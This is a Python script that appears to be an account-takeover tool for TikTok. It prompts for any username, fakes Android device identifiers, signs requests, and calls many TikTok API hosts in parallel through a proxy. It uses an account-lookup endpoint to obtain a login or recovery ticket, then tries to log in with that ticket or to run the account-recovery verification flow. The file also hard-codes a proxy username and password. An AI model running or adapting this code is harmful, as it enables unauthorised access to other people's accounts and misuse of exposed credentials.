import requests
import time
import random
import secrets
import SignerPy
from concurrent.futures import ThreadPoolExecutor, as_completed


class TikTokFlow:
    def __init__(self, username):
        self.username = username.strip()
        self.session = requests.Session()

        proxy = "infproxy_checkemail509:NLI8oq4ZQC2fJ3yJDcSv@proxy.infiniteproxies.com:1111"
        self.proxy_dict = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }

        self.hosts = [  # 👈 نفس الهوستات بدون حذف
            "api16-core-aion-useast5.us.tiktokv.com","api16-core-apix-quic.tiktokv.com",
            "api16-core-apix.tiktokv.com","api16-core-baseline.tiktokv.com",
            "api16-core-c-alisg.tiktokv.com","api16-core-c-useast1a.tiktokv.com",
            "api16-core-quic.tiktokv.com","api16-core-useast5.us.tiktokv.com",
            "api16-core-useast8.us.tiktokv.com","api16-core-va.tiktokv.com",
            "api16-core-ycru.tiktokv.com","api16-core-zr.tiktokv.com",
            "api16-core.tiktokv.com","api16-core.ttapis.com",
            "api16-normal-aion-useast5.us.tiktokv.com","api16-normal-apix-quic.tiktokv.com",
            "api16-normal-apix.tiktokv.com","api16-normal-baseline.tiktokv.com",
            "api16-normal-c-alisg.tiktokv.com","api16-normal-c-useast1a.tiktokv.com",
            "api16-normal-c-useast1a.musical.ly","api16-normal-no1a.tiktokv.eu",
            "api16-normal-quic.tiktokv.com","api16-normal-useast5.tiktokv.us",
            "api16-normal-useast5.us.tiktokv.com","api16-normal-useast8.us.tiktokv.com",
            "api16-normal-va.tiktokv.com","api16-normal-vpc2-useast5.us.tiktokv.com",
            "api16-normal-zr.tiktokv.com","api16-normal.tiktokv.com",
            "api16-normal.ttapis.com","api19-core-c-alisg.tiktokv.com",
            "api19-core-c-useast1a.tiktokv.com","api19-core-useast5.us.tiktokv.com",
            "api19-core-va.tiktokv.com","api19-core-zr.tiktokv.com",
            "api19-core.tiktokv.com","api19-normal-c-alisg.tiktokv.com",
            "api19-normal-c-useast1a.musical.ly","api19-normal-c-useast1a.tiktokv.com",
            "api19-normal-useast5.us.tiktokv.com","api19-normal-va.tiktokv.com",
            "api19-normal-zr.tiktokv.com","api19-normal.tiktokv.com"
        ]

        self.base_params = {
            "device_platform": "android",
            "ssmix": "a",
            "channel": "googleplay",
            "aid": "1233",
            "app_name": "musical_ly",
            "version_code": "370805",
            "manifest_version_code": "2023708050",
            "os_version": "10",
            "device_type": f"rk{random.randint(3000,4000)}",
            "device_id": str(random.randint(10**18, 10**19-1)),
            "iid": str(random.randint(10**18, 10**19-1)),
            "openudid": secrets.token_hex(8),
            "language": "ar",
            "timezone_name": "Asia/Riyadh",
            "region": "SA",
        }

        self.headers = {
            "User-Agent": f"com.zhiliaoapp.musically/{self.base_params['manifest_version_code']}"
        }

    def build_headers(self, params):
        sig = SignerPy.sign(params=params)
        h = self.headers.copy()
        h.update(sig)
        return h

    def fresh_params(self):
        p = self.base_params.copy()
        ts = int(time.time())
        p["ts"] = ts
        p["_rticket"] = int(ts * 1000)
        return p

    # =========================
    # LOOKUP (FULL RESPONSE)
    # =========================
    def _lookup(self, host):
        try:
            params = self.fresh_params()
            params["account_param"] = self.username

            r = self.session.post(
                f"https://{host}/passport/account_lookup/username/",
                params=params,
                headers=self.build_headers(params),
                proxies=self.proxy_dict,
                timeout=5
            )

            j = r.json()
            acc = j.get("data", {}).get("accounts", [])

            if acc:
                a = acc[0]
                return {
                    "stage": "lookup",
                    "host": host,
                    "status": r.status_code,
                    "raw": r.text,
                    "ticket": a.get("passport_ticket") or a.get("not_login_ticket"),
                    "oauth": a.get("oauth_login_only", False)
                }

        except:
            return None

    def get_ticket(self):
        with ThreadPoolExecutor(max_workers=25) as ex:
            for res in as_completed(ex.map(lambda h: self._lookup(h), self.hosts)):
                if res:
                    print("\n🔥 LOOKUP SUCCESS:")
                    print(res["raw"])
                    return res["ticket"], res["oauth"], res

        return None, None, None

    # =========================
    # SAFE (FULL RESPONSE)
    # =========================
    def safe(self, ticket):
        result = None

        def run(host):
            nonlocal result
            try:
                params = self.fresh_params()
                params["not_login_ticket"] = ticket
                params["target"] = "recover_account"

                r = self.session.get(
                    f"https://{host}/passport/shark/safe_verify/",
                    params=params,
                    headers=self.build_headers(params),
                    proxies=self.proxy_dict,
                    timeout=5
                )

                if "2029" in r.text:
                    result = {
                        "stage": "safe",
                        "host": host,
                        "raw": r.text
                    }
            except:
                pass

        with ThreadPoolExecutor(max_workers=25) as ex:
            list(ex.map(run, self.hosts))

        return result

    # =========================
    # AUTH (FULL RESPONSE)
    # =========================
    def auth(self, ticket):
        result = None

        def run(host):
            nonlocal result
            try:
                params = self.fresh_params()
                params["not_login_ticket"] = ticket

                r = self.session.get(
                    f"https://{host}/passport/auth/available_ways/",
                    params=params,
                    headers=self.build_headers(params),
                    proxies=self.proxy_dict,
                    timeout=5
                )

                if "success" in r.text:
                    result = {
                        "stage": "auth",
                        "host": host,
                        "raw": r.text
                    }
            except:
                pass

        with ThreadPoolExecutor(max_workers=25) as ex:
            list(ex.map(run, self.hosts))

        return result

    # =========================
    # LOGIN (FULL RESPONSE)
    # =========================
    def login(self, ticket):
        result = None

        def run(host):
            nonlocal result
            try:
                params = self.fresh_params()
                params["passport_ticket"] = ticket

                r = self.session.post(
                    f"https://{host}/passport/user/login_by_passport_ticket/",
                    params=params,
                    headers=self.build_headers(params),
                    proxies=self.proxy_dict,
                    timeout=5
                )

                result = {
                    "stage": "login",
                    "host": host,
                    "status": r.status_code,
                    "raw": r.text
                }
            except:
                pass

        with ThreadPoolExecutor(max_workers=25) as ex:
            list(ex.map(run, self.hosts))

        return result


if __name__ == "__main__":
    user = input("Enter username: ")
    flow = TikTokFlow(user)

    ticket, oauth, lookup_res = flow.get_ticket()

    if not ticket:
        print("❌ no ticket")
        exit()

    print("\n🎫 Ticket:", ticket)
    print("🔐 AUTH FLAG:", oauth)

    if not oauth:
        login_res = flow.login(ticket)
        print("\n🔥 LOGIN RESPONSE:")
        print(login_res)

    else:
        safe_res = flow.safe(ticket)
        print("\n🔥 SAFE RESPONSE:")
        print(safe_res)

        if safe_res:
            auth_res = flow.auth(ticket)
            print("\n🔥 AUTH RESPONSE:")
            print(auth_res)
